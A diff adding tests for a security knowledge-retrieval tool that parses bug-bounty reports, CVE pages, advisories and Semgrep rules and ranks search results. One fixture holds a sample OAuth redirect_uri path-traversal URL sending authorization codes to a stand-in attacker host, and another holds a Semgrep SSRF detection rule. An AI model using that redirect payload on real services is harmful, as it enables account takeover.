@@ -1780,3 +1780,168 @@ def test_embeddings_blank_model_env_falls_back_to_default(monkeypatch):
     assert LocalEmbedder(model_name="   ").model_name == "BAAI/bge-small-en-v1.5"
     assert LocalReranker().model_name == "jinaai/jina-reranker-v2-base-multilingual"
     assert LocalReranker(model_name="   ").model_name == "jinaai/jina-reranker-v2-base-multilingual"
+
+
+def test_phase3_parsers_hackerone_trickest_ghsa_semgrep():
+    from secrag.chunker import (
+        parse_ghsa_json,
+        parse_hackerone_report_md,
+        parse_semgrep_yaml,
+        parse_trickest_cve_md,
+    )
+
+    h1_md = """# Account Takeover via OAuth redirect_uri Path Traversal
+
+| | |
+|---|---|
+| **Report ID** | [1234567](https://hackerone.com/reports/1234567) |
+| **Program** | [Acme Corp](../by-program/acme.md) |
+| **Severity** | Critical — CVSS 9.3 |
+| **Weakness** | [Improper Authentication](../by-weakness/improper-authentication.md) |
+| **Bounty** | $15,000 |
+| **Resolution** | Resolved |
+
+## Vulnerability Details
+Using `/oauth/callback/..%2f..%2fredirect?url=https://attacker.tld` leaks the authorization code for CVE-2025-11111 via Referer header and allows full account takeover.
+"""
+    h1 = parse_hackerone_report_md(h1_md, "1234567.md")
+    assert h1 is not None
+    assert h1["category"] == "writeups"
+    assert h1["is_high_signal"] is True
+    assert h1["url"] == "https://hackerone.com/reports/1234567"
+    assert "CVE-2025-11111" in h1["cves"]
+
+    trickest_with_poc = """### [CVE-2024-3094](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3094)
+![](https://img.shields.io/static/v1?label=Product&message=Linux&color=blue)
+### Description
+Backdoor in xz-utils liblzma affecting OpenSSH authentication.
+#### Github
+- https://github.com/example/CVE-2024-3094-poc
+"""
+    tr = parse_trickest_cve_md(trickest_with_poc, "2024/CVE-2024-3094.md")
+    assert tr is not None
+    assert tr["cves"] == ["CVE-2024-3094"]
+    assert "img.shields.io" not in tr["full_text"]
+    assert parse_trickest_cve_md("### CVE-2024-0001\nNo poc links here.", "2024/CVE-2024-0001.md") is None
+
+    ghsa = parse_ghsa_json(
+        {
+            "id": "GHSA-aaaa-bbbb-cccc",
+            "aliases": ["CVE-2025-22222"],
+            "summary": "Next.js middleware authorization bypass",
+            "details": "Crafted x-middleware-subrequest header bypasses middleware auth checks.",
+            "database_specific": {"severity": "CRITICAL", "cwe_ids": ["CWE-285"]},
+            "affected": [
+                {
+                    "package": {"ecosystem": "npm", "name": "next"},
+                    "ranges": [{"events": [{"introduced": "14.0.0"}, {"fixed": "14.2.25"}]}],
+                }
+            ],
+        },
+        "advisories/github-reviewed/2025/03/GHSA-aaaa-bbbb-cccc/GHSA-aaaa-bbbb-cccc.json",
+    )
+    assert ghsa is not None
+    assert ghsa["is_high_signal"] is True
+    assert ghsa["cves"] == ["CVE-2025-22222"]
+    assert "`npm:next`" in ghsa["full_text"]
+
+    sg = parse_semgrep_yaml(
+        """rules:
+  - id: express-ssrf
+    severity: WARNING
+    message: User input flows into outbound HTTP request causing SSRF.
+    metadata:
+      category: security
+      cwe: ["CWE-918: SSRF"]
+      vulnerability_class: ["Server-Side Request Forgery"]
+    pattern: axios.get($REQ.query.$X)
+""",
+        "javascript/express/security/audit/express-ssrf.yaml",
+    )
+    assert sg is not None
+    assert sg["category"] == "detection"
+    assert "axios.get" in sg["full_text"]
+
+
+def test_dual_lane_tactical_ranking_prevents_cve_stubs_drowning_bounty_writeups(tmp_path):
+    """Unfiltered technique queries must prioritize deep playbooks & HackerOne writeups
+    over generic CVE catalog stubs, while explicit CVE queries still rank CVEs first."""
+    store = KnowledgeStore(data_dir=tmp_path)
+    embedder = _DummyEmbedder()
+
+    # Insert 6 CVE catalog stubs matching "oauth redirect account takeover"
+    for i in range(6):
+        txt = f"CVE-2025-100{i} OAuth redirect_uri account takeover vulnerability in plugin {i}"
+        store.upsert_document(
+            source="cvelist-v5",
+            category="cve",
+            rel_path=f"cves/2025/CVE-2025-100{i}.json",
+            title=f"CVE-2025-100{i}",
+            url="",
+            tags=["cve"],
+            cves=[f"CVE-2025-100{i}"],
+            full_text=txt,
+            sections_with_chunks=[(f"CVE-2025-100{i}", f"CVEListV5 > CVE-2025-100{i}", txt, [txt])],
+        )
+    # Insert 2 deep tactical sources: PortSwigger Lab + HackerOne Disclosed Report
+    ps_txt = "OAuth redirect_uri path traversal and open redirect chaining for account takeover."
+    store.upsert_document(
+        source="portswigger-labs",
+        category="web",
+        rel_path="oauth-ato.md",
+        title="OAuth Account Takeover via Redirect",
+        url="",
+        tags=["portswigger", "oauth"],
+        cves=[],
+        full_text=ps_txt,
+        sections_with_chunks=[("OAuth ATO", "PortSwigger > OAuth > Redirect", ps_txt, [ps_txt])],
+    )
+    h1_txt = "HackerOne disclosed chain: OAuth redirect_uri bypass leaking code for account takeover."
+    store.upsert_document(
+        source="hackerone-disclosed",
+        category="writeups",
+        rel_path="999999.md",
+        title="H1 #999999: OAuth ATO",
+        url="",
+        tags=["hackerone", "oauth"],
+        cves=[],
+        full_text=h1_txt,
+        sections_with_chunks=[("H1 OAuth", "HackerOne > OAuth > ATO", h1_txt, [h1_txt])],
+    )
+    store.conn.commit()
+
+    vec_idx = store.open_writable_vector_index()
+    for batch in store.iter_unembedded_chunks(batch_size=32):
+        ids = [cid for cid, _ in batch]
+        vecs = embedder.embed_documents([t for _, t in batch])
+        vec_idx.add(np.asarray(ids, dtype=np.uint64), vecs.astype(np.float16))
+        store.mark_chunks_embedded(ids)
+    store.save_vector_index_atomic(vec_idx)
+
+    retr = HybridRetriever(store=store, embedder=embedder, reranker=None)
+    retr.reranker.enabled = False
+
+    # 1. Unfiltered technique query: tactical sources lead and raw CVE stubs capped at <= 1
+    res = retr.search("OAuth redirect_uri account takeover", top_k=5)
+    top_sources = [r["source"] for r in res["results"]]
+    assert set(top_sources[:2]) == {"portswigger-labs", "hackerone-disclosed"}
+    assert sum(1 for s in top_sources if s == "cvelist-v5") <= 1
+
+    # 2. Explicit CVE query: returns the exact CVE first
+    cve_res = retr.search("CVE-2025-1003 OAuth redirect_uri", top_k=3)
+    assert cve_res["results"][0]["title"] == "CVE-2025-1003"
+    assert cve_res["intent"] == "cve"
+
+    # 3. Intent classification + security synonym expansion + cross-source diversity
+    from secrag.retriever import classify_query_intent
+    from secrag.storage import expand_fts5_synonyms
+
+    assert classify_query_intent("single-packet race condition coupon") == "bounty"
+    assert classify_query_intent("Next.js middleware npm package.json") == "whitebox"
+    assert classify_query_intent("AWS IAM Cognito EKS RBAC") == "cloud"
+    assert classify_query_intent("ADCS ESC8 Kerberos delegation") == "ad"
+    assert classify_query_intent("WAF filter bypass without underscores") == "bypass"
+    assert classify_query_intent("anything", focus="bounty") == "bounty"
+    assert "idor" in expand_fts5_synonyms(["BOLA", "api"])
+    assert "takeover" in expand_fts5_synonyms(["ATO", "oauth"])
+    store.close()
